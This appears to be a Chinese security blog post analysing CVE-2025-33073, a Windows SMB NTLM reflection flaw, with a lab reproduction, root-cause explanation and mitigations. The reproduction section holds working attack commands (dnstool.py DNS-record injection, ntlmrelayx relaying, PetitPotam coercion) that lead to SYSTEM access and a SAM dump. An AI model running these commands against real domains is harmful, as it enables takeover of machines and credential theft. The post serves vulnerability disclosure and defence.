#  域内大杀器：CVE-2025-33073 NTLM Reflection攻击  
原创 谢公子  谢公子学安全   2025-06-15 16:53  
  
**漏洞背景和描述**  
  
2025年6月10日，微软发布了每月例行的安全补丁更新。在此次更新中，编号为CVE-2025-33073的严重漏洞引起了业界广泛的关注和重视。微软官方对该漏洞的描述为SMB客户端特权提升漏洞。然而，经过深入分析发现，该漏洞的威胁程度远远超出了普通意义上的“权限提升”范畴。  
  
具体来讲，CVE-2025-33073 漏洞属于 NTLM Reflection（NTLM反射）攻击，而NTLM Reflection攻击是NTLM Relay(NTLM 中继)攻击的一种特殊形式，指的是将获得的受害者机器的NTLM认证请求重新反射回该请求的原始机器。此前在讨论 NTLM Relay 攻击手法时，我们曾介绍过这种特殊的攻击模式。历史上，微软首次公开 NTLM Reflection 漏洞是在安全公告 MS08-068 中，并在随后的补丁中修复并严格限制了此类从 SMB 协议向 SMB 协议进行反射的攻击手段。因此，长期以来，行业内安全人员普遍认为通过 SMB 协议对自身进行 NTLM Reflection 攻击的手法已经彻底修复并无法再利用。然而，CVE-2025-33073 漏洞的出现，却重新激活了人们对这一攻击路径的关注，并再次暴露出 SMB 协议反射攻击的潜在风险。  
  
通过利用该漏洞，攻击者能够在仅拥有一个普通域用户权限的情况下，远程对域内任意计算机(域控除外)发起攻击，并获取目标机上的最高权限。更为严重的是，攻击者一旦入侵域内一台主机，便可借助该漏洞快速地进行横向移动与渗透，在整个企业域环境中蔓延扩散，最终可能实现对全域主机的整体控制，造成极为严重的安全威胁与不可挽回的损失。  
  
如下图所示，是微软官方对漏洞CVE-2025-33073漏洞所做的介绍。企业安全及IT管理员需高度重视此漏洞所带来的潜在风险，及时采取有效措施进行修补、管控与防范，以保障企业域网络环境的安全与稳定。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJ2puialB90lsVpJxqhicg49McMIrgnsIiczXJcTOnozgQwwolpBl7H0ycQ/640?wx_fmt=png "")  
  
  
**漏洞影响版本**  
  
所有未安装2025.6月安全补丁，且未强制启用SMB签名的所有域内计算机(域控除外)。其中域控制器默认强制启用了SMB签名，因此不受直接影响；而域内除域控外的其他计算机在默认情况下一般并不会开启SMB签名防护，因此在未打补丁的情况下，这些机器极易受到此漏洞的攻击风险。  
  
  
**漏洞复现**  
  
   
  
以下对该漏洞进行复现，实验环境如下：  
- 域：xie.com  
  
- 域控：10.211.55.4  
  
- 攻击者机器：10.211.55.132  
  
- 攻击目标： CA.xie.com (10.211.55.6)  
  
- 普通域用户：test  
  
```
# 创建一个特殊DNS记录，指向攻击者的机器10.211.55.132
python3 dnstool.py -u xie.com\\test -p "P@ssw0rd" -r ca1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.211.55.132 --action add 10.211.55.4

#进行监听，攻击目标机器
ntlmrelayx.py -t 10.211.55.6 -smb2support -ts

#进行强制触发，让目标机器向指定DNS记录进行NTLM认证
python3 PetitPotam.py -d xie.com -u test -p P@ssw0rd ca1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 10.211.55.6
```  
  
  
首先我们使用如下命令创建一个特殊的DNS记录，并将这个记录解析指向攻击者控制的服务器，以便后续捕获目标机器发起的认证流量，如图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJQGngg7s0YFXW1xjCtrK9gZ6m1AN2JGvIDaLTtKGbxicnO8D7oMqG5Ig/640?wx_fmt=png "")  
  
随后，在攻击者的服务器端执行以下命令开启NTLM Relay侦听模式，以便等待并捕获目标机器发起的认证流量，并准备将接收到的认证数据反射回目标机器自身，如图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJ7o7wLeeKU5wB7g1kAuHiaa6Sad2ZPrVnzalJSuwcJ5IfvbDq7XtnNww/640?wx_fmt=png "")  
  
最后通过PetitPotam工具强制触发目标机器向我们事先设定好的特殊DNS记录发起NTLM身份认证请求，从而触发本地认证反射漏洞，完成漏洞复现验证，如图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJ5dKKupfKUKY4BcwhNVkUPWeeeK02jNI2CH5hUiaaqAO1q6hH2hA71aA/640?wx_fmt=png "")  
  
  
注：如果将特殊DNS名称指定为localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA，则可以攻击任意机器。  
  
**漏洞原理**  
  
  
了解漏洞原理前建议读者先复习 NTLM协议认证流程、NTLM Relay攻击手法 以及 CVE-2019-1040 NTLM MIC 绕过漏洞。可参见《域渗透攻防指南》1.1节、4.7节和5.2节。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2eicLEm6I67HpTibI5KOmNNwpSPPaIyIkrVKr5kiaKwssgRLncuGr0yKXufN8sepzh3kngLj0Xkx2hZQ/640?wx_fmt=jpeg "")  
  
  
  
**漏洞核心点**  
  
  
该漏洞本质上源于 SMB 客户端在处理目标名称时存在逻辑缺陷。当客户端处理如下格式的目标名称时：  
```
cifs/ca1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```  
  
由于处理不当，会被错误解析为：  
```
cifs/ca
```  
  
随后，在系统进行进一步的校验时，会移除目标名称中的服务类型（如这里的 cifs/），仅取剩下的部分（即上述例子中的 ca）作为主机名进行识别判断。接下来，SMB 客户端会将这个处理后的主机名（本例为 ca）分别与以下字符串进行比对（对比过程不区分大小写）：  
- 当前机器的完全限定域名（FQDN，例如：CA.xie.com）  
  
- 当前机器的主机名（例如：CA），在我们的测试场景中，该主机名恰好与此条相匹配。  
  
- 固定字符串 "localhost"  
  
若与上述任一字符串匹配成功，则目标名称被确认为当前主机本身。如果上述比对均失败，系统将进一步判断目标名称是否为一个 IP 地址并检查该 IP 是否分配于本地计算机上的任何接口。当上述全部检测均无法通过时，则视目标为不同于本地主机的远程目标。  
  
一旦确认目标名称确实为当前机器，系统还会额外校验以下两项条件：  
- 客户端未明确要求进行NULL方式认证；  
  
- 当前使用的是发起请求用户的默认凭据（即未显式指定其他用户凭据）。  
  
仅当以上所有条件得到满足时，客户端才会将自身的 工作站名称（Workstation Name）及 域名（Domain Name）填入 NTLMSSP_NEGOTIATE 消息之中，以推进后续的 NTLM 认证流程。  
  
在随后的 NTLM 认证过程中，当 NTLM 服务器端收到来自客户端的 NTLMSSP_NEGOTIATE 消息并检测到其中包含的“工作站名称”和“域名”与服务器本机一致时，会自动启用 NTLM 本地认证模式。  
  
接下来，我们介绍 NTLM 本地认证的流程与原理。  
  
  
**NTLM本地认证**  
  
  
NTLM本地认证是 NTLM 认证协议中的一种特殊情形：服务端会在 NTLMSSP_CHALLENGE 消息中明确告诉客户端无需计算生成 NTLMSSP_AUTH 的挑战响应值（Challenge/Response）。具体而言：  
  
服务器端动作  
：服务器会在 NTLMSSP_CHALLENGE 消息中设置NTLMSSP_NEGOTIATE_LOCAL_CALL (0x00004000))（本地调用协商）标志，以告知客户端需要进行NTLM本地认证；同时，服务器会创建一个“服务上下文”，将其加入到一个全局上下文列表中，并将此上下文的唯一标识写入到消息的 Reserved 字段中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJckTKfsMX18icueacic5fLCdmibFYKLJz2ZvDQd9gibV5QmHibQnqB6d5jpQ/640?wx_fmt=png "")  
  
客户端动作  
：当客户端收到带有 NTLMSSP_NEGOTIATE_LOCAL_CALL (0x00004000) 标志的 NTLMSSP_CHALLENGE 消息后，即可识别出需采用 NTLM 本地认证模式。随后，客户端会将自身的身份令牌直接放入服务上下文（即 Reserved 字段中的 ID ），而无需传统意义上的认证响应计算过程。由于客户端和服务端都在同一台主机上执行，本地身份认证过程全部发生在同一个 lsass.exe 进程中。最终客户端返回的 NTLMSSP_AUTH 消息内容几乎为空，而服务器则直接使用插入到服务上下文中的客户端身份令牌执行后续操作。  
  
**服务端如何判断是否需要进行NTLM本地认证？**  
  
服务器端是否需要执行NTLM本地认证，将基于客户端在 NTLMSSP_NEGOTIATE 消息中传递过来的两个关键字段进行判断：即客户端的 工作站名称（Workstation Name）和域名称（Domain）。服务端会检查客户端是否在 NTLMSSP_NEGOTIATE 消息中提供了工作站名称和域名称。如果这两个字段同时存在且提供出的值恰好与当前电脑的主机名及域名一致，服务器即认为这是一次本地调用，需要执行NTLM本地认证模式，因此会在 NTLM_CHALLENGE 消息中设置 NTLMSSP_NEGOTIATE_LOCAL_CALL (0x00004000) 标志，并建立相应的服务上下文，将其 ID 信息放入 Reserved 字段。  
  
而正常NTLM认证情况下，客户端并不会在NTLMSSP_NEGOTIATE 消息中传递工作站名字和域名，默认情况这两者的值为NULL。只有当客户端认为此次是NTLM本地认证的情况下，客户端才会发送带有工作站名字和域名的NTLMSSP_NEGOTIATE 消息。如图是正常的NTLM认证流程客户端发送的NTLMSSP_NEGOTIATE 消息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJRaF1dSnZaWlKnNLK4EDSNKYBBynCFHa492pslW6JuWAMAZygzXQWQg/640?wx_fmt=png "")  
  
  
  
**漏洞原理总结**  
  
****  
  
该漏洞的触发机制可以进一步描述为：一开始，当 SMB 客户端接收到攻击者提供的特殊格式 DNS 名称时，由于名称解析过程中存在逻辑缺陷，客户端会错误地将其解析为本机自身的主机名，从而判断此次认证流程应当走“NTLM 本地认证”模式。因此，SMB 客户端便在随后的 NTLMSSP_NEGOTIATE 消息中自动放入了经解析后的工作站名称和域名称，如下图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJR2Rfx8LFrL082tciahmibyDtQSlZ3oDG2iaSAYKZW9WkALM23ib17KpiaOA/640?wx_fmt=png "")  
  
随后，SMB 服务端接收到该含有工作站名称和域名称的 NTLMSSP_NEGOTIATE 消息后，通过与本机自身的工作站名称和域名称进行比对，发现两者完全一致。这促使服务端在发送给 SMB 客户端的 NTLMSSP_CHALLENGE 消息中添加了专门的标志位——NTLMSSP_NEGOTIATE_LOCAL_CALL (0x00004000)，用于明确告诉客户端启用 NTLM 本地认证流程，并在消息中的 Reserved 字段插入相应的身份上下文 ID。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJCbwqmwvAPxNuzooAlKZzDg3F4wibzQpricibDEAHV2S0tPsfLyvStUq6Q/640?wx_fmt=png "")  
  
客户端再收到服务端发来的NTLMSSP_CHALLENGE 消息后，通过NTLMSSP_NEGOTIATE_LOCAL_CALL (0x00004000) 标志发现要启用NTLM本地认证流程，因此客户端会将自身的身份令牌（token）直接放入服务上下文（即图中Reserved 字段中的 ID ）。而由于我们是使用的PetitPotam工具诱导了运行于 SYSTEM 权限下的 lsass.exe 服务向我们控制的服务器发起认证请求再进行反射，因此服务端收到的这个身份令牌具有目标的SYSTEM 权限，而后利用SYSTEM 权限执行了远程注册表操作，成功地导出了目标设备的 SAM 数据库，轻松实现了对目标计算机的彻底入侵与控制。  
  
最后，当客户端接收到带有这一特殊标志位的 NTLMSSP_CHALLENGE 消息后，发现服务端指示必须采用“NTLM 本地认证”的流程，客户端于是将自身当前的登录身份令牌直接放置入服务端事先预设的身份上下文（即图中 Reserved 字段的 ID 对应的上下文）中。而由于我们是使用的 PetitPotam 工具诱导了运行在目标主机上 SYSTEM 权限下的 lsass.exe 进程主动向我们控制的服务器发起身份验证请求，因此此时放入上下文的正是目标主机的 SYSTEM 权限令牌。服务端获取到这一令牌后，本地模拟使用该 SYSTEM 权限成功执行了远程注册表访问操作，进一步成功导出了目标主机的 SAM 数据库相关信息，从而实现了对目标计算机的完全控制。  
  
  
**漏洞预防和修复**  
  
  
对于安全团队来说，有效地预防、缓解并修复该漏洞至关重要。针对上述漏洞的防护，可从部署官方安全补丁、临时缓解方案及安全监测的多层次防护策略入手。  
  
  
**安装补丁**  
  
微软已发布针对该漏洞的补丁程序，企业可直接通过 Windows 自动更新解决以上问题。 具体而言，本次补丁主要修复了mrxsmb.sys驱动程序中的相关函数，以强制拦截在 SMB 连接过程中目标名称中所携带的不恰当的封装化目标信息，从而有效阻止了漏洞利用过程中产生的恶意 SMB 连接请求。强烈建议企业将域控制器与域内主机系统更新至最新版本，以从根本上修复该漏洞。  
  
  
**临时解决方案**  
  
若在一些特殊场景或生产环境中，计算机暂时无法及时安装最新安全补丁，可参考以下方式进行临时性缓解：  
  
  
**禁止普通域用户新建DNS记录**  
  
由于该漏洞在利用过程中需要新建一个特殊的DNS记录，而默认情况下AD域内所有经过身份认证的普通域用户均具备新建 DNS 记录权限，这极大降低了攻击者的利用门槛。因此可通过限制普通域用户创建 DNS 记录以增加漏洞利用门槛，显著提高攻击难度，间接起到很好的防护作用。具体操作方式为：在域控的 DNS 管理器中，对域 DNS 记录区域采取权限限制，移除“Authenticated Users”对于子记录的创建权限，仅授予真正需要权限的用户或安全组，如图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJfjiaO7eZLWfa8w4OQNhoDKnl1BKr95icbRXxe5qicTOH4OJp4fJCapqYw/640?wx_fmt=png "")  
  
  
**开启SMB签名**  
  
AD中默认情况下只有域控默认强制开启 SMB 签名，而域内的其他服务器及终端计算机通常不会开启该特性。而 SMB 签名恰恰能有效阻止此类漏洞利用攻击，因此建议通过组策略在全域系统内批量启用 SMB 签名防护，以杜绝该漏洞的攻击渠道及潜在危害。组策略配置路径：“计算机配置 → 策略 → Windows 设置→ 安全设置 → 本地策略 → 安全选项 → Microsoft 网络服务器: 对通信进行数字签名(始终)”。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJvLD8EMtxJYHFRZsE54bOkFg1XYTjzBwjaWbezVBOcCT2xFOr2jNqzg/640?wx_fmt=png "")  
  
  
**加强对 DNS 日志的审计与监控**  
  
该漏洞利用过程的一个关键环节是创建特定格式的恶意 DNS 记录。因此，企业可对 DNS 服务日志进行实时监控，监控新增 DNS 记录的命名模式，对于类似于漏洞利用中规定的特定格式（如包含`1UWhRCAA`等特殊字符串）DNS 记录的创建行为进行实时告警，通过这一措施，实现对该漏洞攻击尝试的实时检测与快速响应，风控告警如图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJmhbD8AcgA3syfFicgJTtvTGLlKtK0J1Tb4v3WLqq4HPGCaIdwn7dVXw/640?wx_fmt=png "")  
  
  
通过这个漏洞，为我们再次证实了实施“纵深防御”策略，对于保障企业信息安全有着极大的重要性。例如在此案例中启用 SMB 签名策略，即便面对未知 0day 威胁，也能发挥极大的安全防御效果。  
  
  
注：在生产环境执行该加固方案之前，需要先了解该变更可能所产生的潜在影响，并在必要时与IT运维团队协调沟通。在进行任何改变之前，尤其是在大型或复杂的网络中，建议：  
- 在小规模环境中先测试这些改动，以确认新策略不会引发意外问题。  
  
- 通知所有可能受影响的业务部门和用户。  
  
- 确保有一个回滚计划以防不测。  
  
  
参考文章：  
  
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073  
  
https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025#  
  
https://davenport.sourceforge.net/ntlm.html#localAuthentication  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/ibeklblD36g7ib3Vc8Pg8Q3h0BD5jicArMZicKMlnQESg4lA7nS8jO3fBXBM774sibBT8tzwc7jemeic9kVwRn0GHSkg/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/ibeklblD36g7ib3Vc8Pg8Q3h0BD5jicArMZNPibz5XrTtqNSeBrBAVZsMRKdu6POibua0AYJiaRHKuwmt3mHKJia3yFWw/640?wx_fmt=gif "")  
  
（ END ）。  
  
  
  
非常感谢您读到现在，由于作者的水平有限，编写时间仓促，文章中难免会出现一些错误或者描述不准确的地方，恳请各位师傅们批评指正。  
  
如果大家想更加进一步的学习AD域相关知识，可以参加《域渗透攻防》的培训课程，可以参见：[助你弯道超车,《域渗透攻防》培训课程来啦！](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247493234&idx=1&sn=541df1d101f23b97db9f74eafd072e51&scene=21#wechat_redirect)  
  
  
如果你想一起学习AD域安全攻防的话，可以加入下面的知识星球一起学习交流。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cVqPgLMLkm76930sAQZXjJyCN9CZic5T3osoibRicwzpzbkvWPGNTibucObWNhiaQ2FGhkgGDhsSeH67g/640?wx_fmt=png "")  
  
  
  
**点击蓝字 关注我们**  
  
  
  
  
  
